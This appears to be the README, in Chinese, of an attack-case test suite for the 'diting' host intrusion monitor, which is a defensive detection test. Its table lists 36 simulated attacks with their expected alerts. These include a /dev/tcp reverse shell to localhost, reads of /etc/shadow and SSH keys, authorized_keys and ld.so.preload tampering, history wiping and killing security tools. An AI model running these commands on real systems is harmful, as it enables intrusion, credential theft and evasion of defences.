# diting 攻击用例库

36 个攻击用例（case-01~06 为 W4/W5 基础用例，case-07~14 为 W6 D1 规则包配套用例，case-15~22 为 W6 D2 规则包配套用例，case-23~30 为 W7 D3 挖矿/防御规避规则包配套用例，case-31~36 为 W8 S2 AI 专项规则包配套用例），
每个用例 = `run.sh`（攻击动作）+ `verify.sh`（预期事件核对）+ `cleanup.sh`（清理步骤）。
所有用例对同一 monitor 实例执行，验证脚本查询 `events.db`（遥测事件）和 `baseline.db`（alerts 表），
用打标机（mark）做增量计数，因此用例可以连跑多遍、结果互不干扰。

## 用例清单

| 编号 | 名称 | 攻击动作 | 预期事件 | 清理 |
|---|---|---|---|---|
| case-01 | 反弹 shell | `bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'`（本机 nc 监听配合） | process.exec(bash) ×≥2；network.connect 127.0.0.1:4444 ×≥1 | 杀掉 nc 监听 |
| case-02 | 读 /etc/shadow | `cat /etc/shadow`（root） | alerts(/etc/shadow, read)；file.read 事件带进程全路径 + 祖先链 | 无副作用 |
| case-03 | chmod 777 敏感文件 | `chmod 777 /tmp/bg-attack-cases/chmod-target.conf` | alerts(perm/chmod)；file.chmod 事件带操作者进程 | 恢复 644 |
| case-04 | 容器内执行 docker 命令 | 容器挂载 docker.sock 执行 `docker ps` | 容器内 process.exec ×≥1，container_id 为 12 位短 ID。**已知边界**：net_watch 只覆盖 TCPv4+DNS，AF_UNIX 连接无网络事件，以 exec 链+容器归属为判定信号 | 容器 --rm 自清理 |
| case-05 | 敏感路径批量读取 | root 下循环 `cat /etc/shadow /etc/gshadow /root/.ssh/id_rsa` | 每个文件各 ≥1 条 file.read，进程链完整（exe 非空 + ancestors ≥1）；AC-05A/05B alerts ×≥2（shadow 告警与 case-02 共用规则/节流窗口，见实测发现 5） | 假密钥由 run_all 统一删 |
| case-06 | 容器内篡改挂载的基线文件（M0-1 验收） | 容器挂载受保护文件并追加写入 | alerts 带容器短 ID（container_id 非空）；file.write 事件带同样 container_id | 恢复文件内容 |
| case-07 | 反弹 shell（解释器派生） | python3 连接 127.0.0.1:4407 监听并 `subprocess.run` 派生 bash | alerts `dsl.exec_reverse_shell_under_interpreter` ×≥1（W8 S3 根治竞态：`bash -c id` 原地再 exec 使 /proc 富化读到的 exe 变成 id，eval 未命中时以事件自带 pe.exe 复评兜底，见 rule-engine-gaps G24） | 杀掉 nc 监听 |
| case-08 | 双用途网络工具执行 | `nc` 连接 127.0.0.1:4408 本地监听 | alerts `dsl.exec_reverse_shell_dual_use_tool` ×≥1 | 杀掉 nc 监听 |
| case-09 | 临时目录执行无扩展名二进制 | `/tmp` 下复制 /bin/echo 为 tmpexe 并执行 | alerts `dsl.exec_suspicious_tmp_binary` ×≥1 | 删除 tmpexe |
| case-10 | webshell（web 服务派生 shell） | bash 副本改名 nginx（comm 伪造）派生 `/bin/bash -c id` | alerts `dsl.exec_webspawner_shell` ×≥1 | 删除 nginx 副本 |
| case-11 | 读 /etc/shadow（凭据类扩充规则） | `cat /etc/shadow`（root） | alerts `dsl.cred_read_shadow_whitelist` ×≥1 | 无副作用 |
| case-12 | 写 /etc/passwd | 追加一行到**测试替身** `/tmp/bg-attack-cases/passwd-copy` | alerts `dsl.cred_write_etc_passwd` ×≥1（file_path 为替身路径） | 原地覆盖恢复替身内容 |
| case-13 | 篡改 authorized_keys | 向测试家目录 `.ssh/authorized_keys` 追加攻击者公钥 | alerts `dsl.cred_tamper_authorized_keys` ×≥1 | 原地覆盖去除追加行 |
| case-14 | 清空 shell 历史 | `dd` 覆写测试家目录 `.bash_history`（conv=notrunc 保 inode；只有真实 write 才产生 file.write 事件） | alerts `dsl.cred_clear_shell_history` ×≥1 | 追加写恢复内容 |
| case-15 | chmod 设置 SUID 位 | `chmod 4755` 测试替身 suid-target.conf（new_mode 含 s/S 高位精确判定，G11 已于 W8 修复） | alerts `dsl.priv_suid_file_create` ×≥1 | 恢复 0644 |
| case-16 | 非白名单 ptrace attach | python3（非调试器白名单）对 sleep 进程 PTRACE_ATTACH 后 DETACH | alerts `dsl.priv_ptrace_attach` ×≥1 | 杀掉 sleep |
| case-17 | 加载内核模块 | `modprobe dummy`（可逆，dummy 不在白名单） | alerts `dsl.priv_kernel_module_load` ×≥1 | `modprobe -r dummy` |
| case-18 | unshare 创建 user namespace | `unshare --user true`（CLONE_NEWUSER=268435456，ns.flags 数值判定，G10） | alerts `dsl.priv_unshare_user_namespace` ×≥1 | ns 随进程退出自销毁 |
| case-19 | 篡改 crontab | 追加恶意条目到**测试替身** crontab-copy | alerts `dsl.persist_crontab_tamper` ×≥1 | 原地覆盖恢复替身内容 |
| case-20 | 写 systemd unit | 追加 ExecStart 到**测试替身** unit-copy.service | alerts `dsl.persist_systemd_unit_write` ×≥1 | 原地覆盖恢复替身内容 |
| case-21 | 篡改 ld.so.preload | 追加恶意 .so 到**测试替身** ld.so.preload-copy（绝不碰真实文件，破坏性不可逆） | alerts `dsl.persist_ld_preload_tamper` ×≥1 | 原地覆盖恢复替身内容 |
| case-22 | 容器内执行 docker（规则版） | 与 case-04 同动作（容器挂 docker.sock 执行 docker ps），验证 DSL 规则告警 | alerts `dsl.persist_container_docker_exec` ×≥1 | 容器 --rm 自清理 |
| case-23 | 矿池端口外联 | python3 连接 127.0.0.1:3333 本地监听（stratum 端口；禁真实外连矿池） | alerts `dsl.mining_pool_port_connect` ×≥1 | 杀监听 |
| case-24 | 矿池域名解析 | `dig pool-test.minergate.example.invalid`（含矿池关键字，无需解析成功） | alerts `dsl.mining_pool_dns_query` ×≥1 | 无副作用 |
| case-25 | 挖矿二进制执行 | /bin/sleep 副本改名 xmrig 放 /opt 执行（避开 /tmp 的单命中遮蔽） | alerts `dsl.mining_binary_exec` ×≥1 | 删替身 |
| case-26 | /dev/shm 执行 | sleep 副本放 /dev/shm 执行（无扩展名；验证 shm 命中域归 mining 规则） | alerts `dsl.mining_shm_exec` ×≥1 且 `dsl.exec_suspicious_tmp_binary` ×0 | 删替身 |
| case-27 | 清空安全日志 | 追加写**替身** auth.log-copy / wtmp-copy（G9：truncate 无事件） | alerts `dsl.evasion_clear_security_log` ×≥1 | 原地覆盖恢复 |
| case-28 | 停审计服务 | `systemctl is-active/is-enabled auditd/rsyslog`（非破坏性；G19 退化规则无法区分动作，禁真停服务） | alerts `dsl.evasion_stop_audit_service` ×≥1 | 无副作用 |
| case-29 | chattr 锁定 | `chattr +i` 测试文件（G19：+i/-i 不可区分） | alerts `dsl.evasion_chattr_immutable` ×≥1 | `chattr -i` |
| case-30 | 杀安全工具 | sleep 副本改名 falco 后 `pkill`（pkill 是 pgrep 符号链接，规则按 comm 判定，G21） | alerts `dsl.evasion_kill_security_tool` ×≥1 | 杀替身进程删文件 |
| case-31 | 非白名单读模型文件 | `cat` 读受管目录外替身 victim-read.safetensors（事前注入 model_file 资产行） | alerts `dsl.ai_model_file_read` ×≥1 且 AI 升级联动 escalated=1、medium→high | 删注入的资产行 |
| case-32 | 模型文件删除/改名 | `mv` 改名替身 victim-rename.pt（保 inode，不用 rm——重建换 inode 第 2 轮无事件） | alerts `dsl.ai_model_file_delete` ×≥1 且升级联动 escalated=1、high→critical | 改回原名 + 删资产行 |
| case-33 | 模型目录访问 | `cat` 读受管目录替身 models/model.gguf（与 file-read 按目录前缀互斥，G8） | alerts `dsl.ai_model_dir_access` ×≥1 且升级联动 escalated=1、medium→high | 删注入的资产行 |
| case-34 | AI 工作负载外连 | python3（comm 命中 AI 运行时集合）连接本机外网口地址（local 路由投递，不出网卡）；负面对照连 127.0.0.1 | alerts `dsl.ai_workload_outbound` ×≥1 且 dip=127.0.0.1 ×0 | 杀监听 |
| case-35 | 非 AI 进程加载 CUDA 库 | `cat` 读 libcuda.so.1 替身（本机无真实驱动库，替身路径走 in 字面量登记） | alerts `dsl.ai_cuda_inject` ×≥1 | 无副作用 |
| case-36 | 非白名单访问 GPU 设备 | `cat` 读 /dev/nvidia0 替身（本机无 GPU） | alerts `dsl.ai_gpu_device_access` ×≥1 | 无副作用 |

## W8 S2 用例（31~36）设计说明

1. **AI 升级联动断言（case-31/32/33）**：run.sh 在攻击动作前把替身路径写进 alerts 同库
   （/var/lib/diting/baseline.db）的 assets 表（asset_type=model_file，last_seen=当前时间），
   W6 D4 的 MaybeBoostForAi 按 alerts.file_path 命中资产升一级；verify.sh 写死升级前后级别值
   （severity_origin/severity）与 escalated=1 双重断言，防"字段置位但级别未变"的假联动。
   cleanup.sh 删除注入行，避免污染后续运行。
2. **替身选址与互斥（G8）**：case-31 替身在 unmanaged/（受管目录外，归 file-read）；
   case-33 替身在 models/（受管目录替身前缀内，归 dir-access）——两规则按目录前缀显式互斥，
   各归各位。case-34 的 dport 8443 避开矿池端口段（ai-workload-outbound 已显式剔除该段，
   不抢占 mining-pool-port-connect）。
3. **安全约束**：不碰真实模型仓库、/dev/nvidia*、CUDA 库；外连只到本机外网口地址
   （127.0.0.1 已被规则豁免且无法触发，本机地址经 local 路由表投递不出网卡）。
4. **G18 warn 降级是预期**：无 GPU 机器上真实 libcuda//dev/nvidia* 路径登记失败逐条 warn，
   规则加载不受影响，命中链路全部由替身路径验证。

## W7 D3 用例（23~30）设计说明

1. **替身与安全约束**：矿池连接只连 127.0.0.1 本地监听（规则选型"端口匹配不强制外网 IP"，理由见
   rules/core/mining-ta0040.yaml desc）；DNS 用 .invalid 域名无需解析成功；日志类沿用替身路径
   （禁动真实 /var/log）；systemctl 用 is-active 非破坏性调用（禁真停 auditd/rsyslog）。
2. **单命中（G8）选址**：case-25 的 xmrig 替身刻意放 /opt 而非 /tmp——exec 桶内 exec-ta0002 先于
   mining-ta0040 加载，/tmp 下无扩展名执行会归 exec-suspicious-tmp-binary；case-26 反向验证
   /dev/shm 命中域已从 tmp 规则移交 mining-shm-exec（tmp 规则必须 ×0）。
3. **G19 退化规则的用例形态**：case-28/29/30 验证的是"exe/comm 命中路径"而非攻击语义本身
   （cmdline 不可见），用例注释均注明退化边界。
4. **pkill 按 comm 判定（G21）**：pkill 是指向 pgrep 的符号链接，exe 富化后恒为 /usr/bin/pgrep，
   按 exe 写规则永不命中；comm 取 argv[0] 调用名可区分 pkill/pgrep。
5. **祖先链豁免的坑**：`not process.ancestors[].comm in (systemd)` 会把几乎所有交互进程豁免掉——
   pid 1 恒在 8 层祖先链内（首轮回归 case-28/30 零告警踩出），祖先链豁免只能用非 pid-1 的 comm。
6. **告警链路延迟**：背景事件量大时（vscode-server 噪声）告警落库峰值 ~8s，lib.sh wait_flush
   已从 2s 放宽到 4s；个别用例偶发超窗属环境抖动，重跑即过。
7. **rsyslog 写盘线程**：auth.log 的正常写入者 comm 是 "rs:main Q:Reg"（线程名含空格、exe 富化为空），
   DSL 裸串无法表达含空格 comm，规则按 `rs:main`/`rs:action` 前缀豁免（见 evasion-clear-security-log fpr_note）。

## W6 D1 用例（07~14）设计说明

1. **file 类规则的前提**：DSL 规则的 file.* 条件只对 config.yaml `rules:` 注册的 inode 生效（引擎缺口 G6），
   因此 AC-12/12B/13/14 四条监控规则是为 DSL 规则供事件的前置注册，且**测试文件必须先于 monitor 启动创建**。
2. **inode 稳定性**：用例与 cleanup 只追加/截断/原地覆盖（`cat >`），**禁止 `sed -i`、`rm` 后重建**——inode 变化后第 2 轮无事件。
3. **写 /etc/passwd 的替身选型（case-12）**：安全约束禁止写真实 /etc/passwd。两个候选：
   - bind-mount 副本覆盖 /etc/passwd 再写——**否决**：LSM 事件按 inode 过滤，bind 后目标 inode 不是已注册 inode，无事件（G6/G7）。
   - 替身路径写入规则 condition 列表——**采纳**：`file.path in (/etc/passwd, /tmp/bg-attack-cases/passwd-copy)`，DSL 无变量/宏，只能硬编码两条路径。
4. **comm 伪造技巧（case-10）**：comm 取 exec 文件的 basename（非 argv[0]），`cp /bin/bash nginx` 即得到 comm=nginx 的父进程，无需真实 web 服务。
5. **exec 类规则不验证告警以外的网络事件**：network 事件未接入规则引擎（G3），反弹 shell 的网络侧只作遥测存在，不参与 DSL 判定。
6. **引擎单事件单告警（G8）+ 按 rule_id 全局节流 10s**：用例间要防止"规则被别的用例抢走/节流"。
   实测踩过三个坑：(a) 规则 1 祖先列表含 node 时，测试框架自身（vscode node 链）让所有用例的 bash 都命中规则 1，
   既遮蔽了 case-10 的规则 4，又因节流让 case-07 窗口内无告警；(b) case-07 用 nc 做监听端会触发 dual_use 规则，
   10s 内 case-08 的 nc 告警被节流——监听端改用 python；(c) `truncate -s 0`/`cp /dev/null`/空输入 `tee` 只 open 不写数据，
   本探针只对真实 write(2) 产生 file.write 事件（kernel 7.0 实测），case-14 改用 `dd conv=notrunc` 覆写。

## W6 D2 用例（15~22）设计说明

1. **priv/ns 类用例不依赖 file 注册**（G3 修复后 priv/ns 事件已接入规则引擎），case-16/17/18 无需替身，
   直接用真实攻击动作（python3 ptrace attach、modprobe dummy、unshare --user），全部可逆。
2. **SUID 规则的替身与精确判定**：W8（2026-10-14）G11 已修复——file.new_mode 保留 setuid/setgid 高位
   （ls 语义 s/S），`chmod 4755` 渲染为 `rwsr-xr-x` 与 `chmod 755`（`rwxr-xr-x`）可区分，
   规则按 `new_mode contains s/S` 判定；用例固定用 4755 触发、cleanup 恢复 0644。
3. **crontab/systemd/ld.so.preload 用替身路径**（安全约束：不碰真实系统配置；ld.so.preload 写入是
   全系统级破坏，尤其严禁），替身路径硬编码进规则 condition 列表（G7 无路径变量，同 D1 case-12 思路），
   对应 AC-15/19/20/21 四条 FIM 注册是为 DSL 规则供 file 事件的前置（G6）。
4. **case-22 与 case-04 同一攻击动作、不同验证对象**：case-04 验证容器内 exec 遥测事件，
   case-22 验证 DSL 规则告警（ancestors 容器运行时归属判定，兼容 exec container_id 缺失场景）。
5. **节流与遮蔽**：8 条新规则命中域与 D1 规则互斥（G8 审计：file.write 按路径族互斥、
   priv.*/ns.unshare/file.chmod 均为独占事件类型）；容器启动可能触发的模块按需加载已由
   priv-kernel-module-load 的模块名白名单吸收（overlay/netfilter 家族）。

## 执行方式

```bash
sudo -v                          # 先缓存凭据
sudo -n bash tests/attack-cases/run_all.sh
```

run_all.sh 做的事：
1. 前置检查（sudo 凭据、diting、docker）。
2. 准备用例文件（chmod 目标、受保护基线文件；`/root/.ssh/id_rsa` 不存在时生成临时假密钥并打标）。
3. 以 `tests/attack-cases/config.yaml` 启动 monitor（LSM 或 kprobe 自动降级），等待 "Monitoring started"。
4. 30 个用例连跑 2 遍，每遍 run → verify → cleanup；轮间等待 12s 让告警节流（throttle=10s）过期，保证每遍告警都能落库。
5. SIGTERM 优雅停止 monitor，输出 PASS/FAIL 汇总。退出码 0 = 60 项（30 用例 × 2 轮）全 PASS。

单独跑某个用例（monitor 已在运行时）：

```bash
bash tests/attack-cases/case-02-read-etc-shadow/run.sh my-tag
bash tests/attack-cases/case-02-read-etc-shadow/verify.sh my-tag
```

## 配置说明（config.yaml）

- 监控路径：`/etc/shadow`、`/etc/gshadow`、`/root/.ssh/id_rsa`（read/write/delete/chmod alert）、
  `/tmp/bg-attack-cases/chmod-target.conf`、`/tmp/bg-attack-cases/protected-baseline.conf`。
- `throttle: 10`：有意调小，保证连跑 2 遍时每遍告警都能落库（仓库根 config.yaml 的 300s 节流会让第 2 遍丢告警）。
- webhook 留空，仅本地落 alerts 表。

## 实测发现（2026-10-03 首轮验证踩出，已按实际行为修正 verify 脚本）

1. **monitor 实时告警固定落系统库 `/var/lib/diting/baseline.db`**（`main.cpp` 中 alert_db
   使用默认路径），与 `monitor --db` 指定的文件无关。verify 查 alerts 必须查系统库（root 权限）。
2. **规则类告警的 event_type 归一化为 `read`/`write`**（chmod 触发也是 `write`）；
   `perm_changed`/`hash_changed`/`missing` 只属于离线基线核查（rule_id=`baseline-check`）。
3. **process.exec 事件暂无 container_id 富化**（M0-1 只覆盖 file/priv/ns 类事件）；
   容器内进程的归属判据是祖先链中的 `runc` / `containerd-shim`（实测存在）。
4. 容器场景下 LSM 钩子记录的是**宿主机路径**（不是容器内的挂载路径），container_id 列为 12 位短 ID。
5. **同一文件只允许一条监控规则**：规则按 inode 注册进 `inode_to_rule` map，两条规则配同一
   路径时后加载的覆盖先加载的（本轮实测：给 /etc/shadow 加第二条规则 AC-05C 后，AC-02 整轮零告警）。
   因此 case-05 的 shadow 告警与 case-02 共用 AC-02 及其 10s 节流窗口，verify 对 shadow 告警不做硬性预期
   （事件维度验证不受影响），gshadow/id_rsa 由 AC-05A/AC-05B 独占、稳定告警。
6. verify 查询 alerts 必须带 `rule_id` 过滤，否则相邻用例的同路径告警会造成假阳性（本轮实测踩过）。

## 已知边界

- **case-06 偶发 flake（W8 S3 记录）**：与 case-07 同族的"消费时 /proc 富化竞态"，但对手是
  **进程退出**而非再 exec——容器内 `sh`（echo 为内建命令，写完即退）存活仅毫秒级，exec 事件
  消费滞后于进程退出时，`container_id_of(pid)` 读 /proc/<pid>/cgroup 失败，告警/事件的
  container_id 为空。与内核丢包无关。根治方向同 G24：内核侧事件时刻捕获容器归属
  （task cgroups），或 fork 事件即填 container_id 缩小窗口（仍属竞态缓解非根治）。
- **case-04**：AF_UNIX socket 连接（docker.sock）不在 net_watch 覆盖范围（当前仅 TCPv4 connect/accept/bind + DNS）。
  判定信号为容器内 exec 链 + 祖先链容器运行时归属；unix 连接遥测、exec 事件 container_id 富化是后续迭代项。
- exec 事件的 argv/cmdline 采集在 W2 时列为边界，若仍未采集，反弹 shell 的命令行内容不可见，用 connect 事件做唯一性判定。
